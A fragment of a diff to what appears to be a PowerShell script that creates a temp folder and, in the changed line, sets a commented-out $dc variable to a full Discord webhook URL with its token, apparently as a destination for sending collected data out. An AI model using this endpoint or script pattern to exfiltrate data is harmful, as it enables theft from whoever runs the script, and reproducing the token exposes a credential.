@@ -19,7 +19,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 #$db = ""
 
-#$dc = ""
+#$dc = "https://discord.com/api/webhooks/1305706593354256384/kOKYeEbjv1Z_UdKNXbWrQ-YX3J1UEmhY27cs1-1DBvw4GtXltsxJ2fWX5KZSC8xV2iPc"
 
 ############################################################################################################################################################
 
